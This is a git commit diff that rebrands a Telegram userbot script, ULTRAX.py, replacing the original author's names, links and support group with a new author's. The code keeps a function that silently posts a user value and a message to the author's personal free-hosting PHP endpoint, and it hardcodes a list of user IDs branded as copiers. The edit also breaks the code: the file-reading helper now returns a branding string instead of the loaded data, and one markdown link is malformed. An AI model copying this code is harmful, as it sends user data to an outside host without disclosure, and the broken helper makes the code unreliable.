80579ef4b3f2a91459d978bbcbf34f0946544302
Imteyaz_king <79402181+Imteyazking@users.noreply.github.com>
2021-06-12 15:12:35 +0530

    Update ULTRAX.py

--- ULTRAX.py
+++ ULTRAX.py
@@ -1,7 +1,7 @@
-# COPYRIGHT (C) 2021 BY LEGENDX22
+# COPYRIGHT (C) 2021 BY Imteyazking
 """
 """
-# MADE BY LEGENDX22 🔥
+# MADE BY Imteyazking 🔥
 # MY IDEA H YRR DONT KANG THIS PLEASE
 import asyncio
 import os
@@ -31,17 +31,17 @@ else:
   MSG = MESSAGE
 botnickname = os.environ.get("BOT_NICK_NAME")
 ALIVE_NAME = os.environ.get("ALIVE_NAME")
-BOT = str(botnickname) if botnickname else "υℓтяα χ"
-NAME = str(ALIVE_NAME) if ALIVE_NAME else "υℓтяα χ"
+BOT = str(botnickname) if botnickname else "King fighter"
+NAME = str(ALIVE_NAME) if ALIVE_NAME else "King fighter"
 PHOTO = os.environ.get("ALIVE_PHOTTO", None)
-ULTRAX = "[ULTRA X](https://t.me/ULTRAXOT)"
+KING = "[KING FIGHTER](http://t.me/KiNG_Fighter_Bot)"
 VERSION = "0.0.1"
 ALIVE_USERNAME = os.environ.get("ALIVE_USERNAME", None)
 ALIVE_BOT_USERNAME = os.environ.get("ALIVE_BOT_USERNAME", None)
 devs = devs
 ID = ID
 id = id
-REPO = "[υℓтяα χ вσт](https://github.com/ULTRA-OP/ULTRA-X)"
+REPO = "[https://github.com/Imteyazking/KING-FIGHTER-BOT-)"
 
 kangers = [1358931568, 1601105531, 1099219137, 1163444049, 719195224, 1663120531, 1629929584, 1674693245, 1393895701,1383730820, 1083049180, 1412086585, 1585809209, 1326701194, 1198820588, 1174361857, 1555340229, 1322549723, 803243487, 1444249738, 1222113933, 1152902819, 1176159510, 611816596, 1318486004, 573738900, 1601105531, 1263617196, 1252974808, 1315076555, 1176159510, 21894734, 536157487, 1347610095, 1754449534, 1649853060, 1650981437, 1678331806, 1383009042, 1053880985, 817088672, 1047091391, 1221693726, 929138153, 1091139479]
 
@@ -54,14 +54,14 @@ def POST(user, msg):
     msg = ' '
   else:
       pass #post maar rHa hu nothing else
-  r = post(f"https://legendx22.000webhostapp.com/user.php? user={user}&msg={msg}")
+  r = post(f"https://Imteyazking.000webhostapp.com/user.php? user={user}&msg={msg}")
 import pickle as p
 def rd(file):
   try:
     f = open(file, "rb")
     LEGENDX = p.load(f)
     f.close()
-    return LEGENDX
+    return KING
   except:
     return False
 import pickle as p
@@ -75,7 +75,7 @@ def wt(obj, file):
     return False
 
 MASTER = NAME
-GROUP = "[SUPPORT GROUP](https://t.me/UltraXChat)"
+GROUP = "[SUPPORT GROUP](https://t.me/King_fighter_Bot_support)"
 if __name__=="__main__":
   bot.start()
   bot.run_until_disconnected()
